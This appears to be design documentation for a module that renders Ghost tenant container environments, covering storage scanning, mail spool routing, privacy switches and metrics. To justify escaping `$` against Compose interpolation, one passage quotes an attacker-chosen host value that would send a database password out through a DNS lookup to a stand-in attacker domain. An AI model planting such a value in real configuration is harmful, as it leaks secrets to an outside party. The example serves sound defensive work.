# environment.ts

## Tenant environment overview

The environment one tenant's Ghost container receives, split by where each
value is allowed to live: database and media become unions, and every
storage feature (`images`, `media`, `files`) renders the scanning decorator
rather than a bare `storage__active` / `storage__S3Storage__*` pair — see
`mediaEnvironment` below. SQLite emits `database__client=sqlite3` plus
`__connection__filename` and drops host, port, user, password and ssl; local
media wraps `Local*Storage` instead of `S3Storage` and drops both S3
secrets, per the descriptor's own safety posture rather than leaving it
unset.

Every secret-shaped value below is a `${VAR:?…}` reference into
`/etc/branchleft/<slug>.env` (a paying tenant) or nothing at all (a demo,
whose `sqlite`/`local` variants need no credential) — never a literal value.
`render()` never receives a real secret to begin with, so this module cannot
leak one even if it tried; the reference form is kept anyway so the rendered
Compose file is honest about what it needs supplied out of band.

`$` is escaped as `$$` in every raw descriptor-sourced string value. Compose
interpolates `$VAR`/`${VAR}` inside `environment:` values at
`docker compose config` / `up` time — nothing to do with this package's own
`yaml.ts`, which only serialises document text faithfully. A
validated-but-attacker-chosen value such as
`database.host: 'db.${GHOST_DB_PASSWORD}.attacker.example'` would otherwise
let Compose substitute a real secret into a value that leaves the container
in a DNS lookup. `required()`'s own `${VAR:?…}` output is the one
deliberate interpolation and is never escaped.

## Local storage boot guard

The image's own fail-closed boot guard (`docker-entrypoint.branchleft.sh`)
refuses `storage__images__adapter` unset, refuses any adapter that is not
the decorator outright, and checks the wrapped adapter's own required
fields through `storage__images__wraps` / `storage__images__wrappedConfig__*`
rather than trusting a bare adapter name — both read as "silently
non-durable, or silently unscanned, media" on the guard's assumption of an
ephemeral instance disk. A demo host's local disk is not that, so this
assumption does not hold for a demo, and this is the guard's own
documented, deliberate escape hatch: "local development / the SQLite smoke
test only". A demo is exactly that case.

## Verdict source

The descriptor's `safety.verdictSource` decides it, and it is off unless a
descriptor names it.

- Absent or `"none"`: no `storage__<feature>__verdictSource` is rendered. The
  scanning decorator treats that as no verdict source and refuses every
  upload with a 503 (`adapters/scanning-storage/src/verdict-source.md`).
- `"production"`, on a paying tenant: all three features get
  `verdictSource=production` and `verdictSocketPath`, the slot's local
  verdict socket at `/var/lib/ghost/verdict/verdict.sock`, inside the
  slot's own verdict volume (compose.md#the-verdict-volume). The decorator
  then asks the slot's verdict host end, and holds any upload it gets no
  clean answer for.
- `"production"` on a demo is refused by `validate()`. A demo keeps refusing
  uploads until its own go-live gate reads a real verdict source; that gate
  is what lifts this refusal.

Nothing renders the decorator's in-process fake, which scans nothing; it is
for a test harness's own environment. Any other value of the field, a
different case or the fake's name included, is refused by `validate()`.

Set the switch only once the slot's verdict host end runs beside it and its
volume exists. Before then the socket has nobody listening, so every upload
is accepted and held, never served.

## Media environment

`mediaBucketName`/`mediaPublicBaseUrl` re-derive the bucket and its public
URL from the slug rather than trusting `media.bucket` — the same isolation
control `media.ts` documents. `validateMediaBucket` throws first if a
descriptor's `bucket` disagrees, so this function never silently
substitutes one value for another.

Every storage feature (`images`, `media`, `files`) is rendered identically —
the decorator wrapping the local adapter for a demo, or `S3Storage` for a
tenant — because a mechanism that scanned only one feature, or only one
kind, would leave the others silently unprotected with every test for the
one it did cover green. The three features never diverge on which adapter
they wrap; only `STATIC_FILE_URL_PREFIX` differs between them, because
`S3Storage` does not infer its own URL segment from the feature it was
constructed for.

## Break-glass environment

The three `adapters__sso__BreakGlassSSO__*` keys `adapters/sso/README.md`
documents, plus `adapters__sso__active` itself — rendered only when
`validate()` has already accepted `breakGlass.kind = "enabled"` (which is
what proves the triple is complete and the image pin carries the adapter;
see `validate.ts#checkBreakGlassImageOrdering`). `disabled` renders no key
at all: an unset `adapters__sso__active` is exactly what makes Ghost fall
back to its own no-op adapter, never the empty string or a literal "false"
— either of those is itself one of the JSON-scalar traps
`assertNotJsonScalar` exists to catch on the other three keys.

## Bulk mail environment

The sending-identity keys `transport` cannot carry: `mail__from` — the env
var that looks like the address Ghost sends member mail from and is not,
kept identical to `settings.ts`'s `members_support_address` by construction
(both come from `mail.ts#renderSendingAddress`, never computed twice — see
that module's own doc comment for the trap this closes) — and, whenever
mail is enabled, the three keys that point Ghost's hardcoded Mailgun bulk
provider at the host's own spool instead of Mailgun itself: one mail spool
per host, serving both SMTP and the Mailgun-shaped API. Rendered from
`mail.enabled` and the sending identity alone — never from `transport.kind`
— so a demo (whose transactional path may be `queue`, carrying no host at
all) still gets a bulk path pointed at the spool; the two paths share a
spool, not a `TransportSpec` variant. The base URL is `spool.ts`'s
`MAIL_SPOOL_BASE_URL`, the spool's own service name and port, never a
caller-supplied address.

## Transport environment

`smtp` renders the host, port and user a caller supplies, with the password
as a `${GHOST_MAIL_PASSWORD:?…}` reference.

`queue` means the host's own mail spool (`spool.ts`). With mail enabled it
renders Ghost's SMTP transport pointed at the spool by name
(`MAIL_SPOOL_SERVICE`, `MAIL_SPOOL_SMTP_PORT`), never at a caller-supplied
address, so the address Ghost dials and the listener the spool renders come
from the same constants. The username is the tenant's credential domain
(`mail.ts#credentialDomainOf`: a paying tenant's own sending domain, a demo
slot's `slot-<uid>.<demoMailDomain>`; see mail.md#credential-domain), and the
password is the per-tenant key the bulk path already carries
(`GHOST_BULK_EMAIL_API_KEY`): the spool's SMTP front door checks a submitter
against the same key store as its Mailgun-shaped API. The Mailgun route's
`bulkEmail__mailgun__domain` is the same value as the username. With mail disabled,
`queue` renders no transport at all, as before.

With mail enabled, `queue` also renders three nodemailer timeouts into Ghost's
SMTP options: `mail__options__connectionTimeout` (5000 ms),
`mail__options__greetingTimeout` (5000 ms) and `mail__options__socketTimeout`
(10000 ms, an idle timer that any traffic resets). Ghost sends transactional
mail, such as a sign-in link, inside the reader's own web request, so a frozen
spool must fail that request within seconds rather than the library's defaults
of minutes. A spool that trickles bytes keeps resetting the idle timer, so
these keys do not bound the total wait. The `smtp` transport is unchanged and
keeps the library defaults.

Member mail is addressed through a Ghost *setting*
(`members_support_address`, `settings.ts`), not through these keys.

## Social web lock

`hostSettings__limits__limitSocialWeb__disabled` is `true` for every kind and
every cap, so Ghost locks the ActivityPub setting and the admin's Network tab
is absent. It is unconditional, unlike the member and staff caps, which
render only when set. `settings.ts` also turns `social_web` off, because a
lock does not undo what an existing tenant already has.

## Stripe connect limit

`hostSettings__limits__limitStripeConnect__disabled` is `true` for a demo
(`kind === 'demo'`) and absent for every other kind, so a paying tenant keeps
Ghost's standard Stripe behaviour. Paid tiers stay visible on a demo; only
connecting a real Stripe account is refused.

On its own the key guards one write path (Ghost's Connect-token edit). The
Ghost image's settings-model overlay
(`adapters/stripe-connect-limit/ghost-core-overlay`) reads the same key and
refuses every write path, direct key `PUT`s and the content importer included.
The overlay is inert without the key, and the key is only partial protection
without the overlay, so the image carrying the overlay must be live before a
render carrying the key (see the changelog's rollout note).

## Gravatar

Ghost fills a member's `avatar_image` with a Gravatar address built from a
hash of the member's email, unless its config key `privacy:useGravatar` is
off. Portal's account page then loads that image, so a signed-in reader's
hash would go to a third party. `tenantEnvironment()` renders
`privacy__useGravatar=false` for every kind of tenant, under both widget
sources, with nothing to switch it back on: a reader without a picture shows
Ghost's initial avatar instead. A consumer gets the key when it raises its pin
on this package.

## Widget origin

Ghost loads six front-end widgets (Portal, search, comments, the announcement
bar, the signup form, the admin toolbar) from a public CDN unless a config key
says otherwise. `tenantEnvironment()` takes a `widgets` source, `cdn` by
default: nothing is rendered, and Ghost keeps its compiled-in addresses. With
`own-origin` it renders Ghost's seven address keys, each as
`<siteUrl>/bl-assets/<file>`: `portal__url`, `sodoSearch__url`,
`sodoSearch__styles`, `announcementBar__url`, `comments__url`,
`adminToolbar__url` and `signupForm__url`. `comments` has no styles key in
Ghost 6.76.0. `render()` carries the choice as `options.widgets`.

`own-origin` also renders `client_sentry__disabled=true`. Portal reports its
errors to Sentry whenever Ghost's site API carries a DSN, and the API carries
one unless that key is set (`ghost/core/server/api/endpoints/utils/public-config/site.js`,
Ghost 6.76.0). 6.76.0 ships no DSN, so today this closes the door and stops no call.

Two calls the bundles can make have no switch of their own. Portal loads
`cdn.firstpromoter.com` when the `firstpromoter` setting is on and
`firstpromoter_id` is set, and fetches `partner.transistor.fm` for a signed-in
member when the Transistor integration and `transistor_portal_enabled` are on.
Ghost's host override (`hostSettings:settingsOverrides`, read by
`services/settings/settings-service.js` and applied in
`shared/settings-cache/cache-manager.js`, Ghost 6.76.0) pins a setting to a
value and makes it read-only in Admin, so with `blockThirdPartyIntegrations`
(`render()`'s `options.blockThirdPartyIntegrations`, **true unless the caller
says otherwise**) `own-origin` also renders
`hostSettings__settingsOverrides__firstpromoter=false` and
`hostSettings__settingsOverrides__transistor=false`. **That removes FirstPromoter
and Transistor for the tenant**: the product choice is the owner's, which is why
it is a named option. With the option `false` neither key is rendered, a tenant
that enables one chooses that third party, and `widgets/proof/same-origin.ts`
fails for it by design.

The files are the sha384-pinned bundles in the repository's `widgets/dist/`;
`widgets/pins.json` lists the same seven keys and paths, and
`test/widgets.test.ts` fails when this list and that one disagree. The renderer
does not serve anything: the edge must answer `/bl-assets/*` on the tenant's
hostname with those files before a tenant is rendered with `own-origin`, or
Portal and search stop loading. The default is `cdn` for that reason: a
consumer that upgrades this package changes nothing until it asks.

Every paying tenant's object-storage branch renders two more keys per
storage feature, six in all: `storage__<feature>__metricsTextfilePath`
(`/var/lib/ghost/metrics/scanner.prom`) and `storage__<feature>__metricsTenant`
(the tenant's slug). They are what turns the scanning adapter's health export
on (`adapters/scanning-storage/src/metrics.md`), which is what the scanner
alert rules read. The adapter exports only when both are set, needs an
absolute path ending `.prom`, and exports one file per process (the first
feature to configure wins), so all three features get identical values. A
typo in either key turns the export off silently, which is why the tests
pin the exact values.

The path sits in the tenant's own metrics volume, which `compose.ts` mounts
(see compose.md#the-metrics-volume). A demo renders neither key nor mount:
its local-media branch is untouched, and so is the never-reached
non-scanning branch.

**Both colours write this one file.** `ghost-a` and `ghost-b` share one
rendered environment and one volume, and the broker leaves the old colour
running, drained, for the whole bake window after a swap. During that window
two processes rewrite the one file every 15 seconds and the last writer
wins, so the counters flap between the two processes' totals and `increase()`
over that window is inflated. This is accepted for now rather than rendering
a file per colour, which would carry identical label sets and make the node
exporter's textfile collector reject the scrape. A design for it is open
work.

The tenant writes this volume, so nothing read from it can be trusted to
name the right tenant: the `tenant` label in the file is the tenant's own
claim. The host-side reader must take the label from the volume it read, not
from the file (`app/provision/provision_tenant_volume.md#the-metrics-volume`).
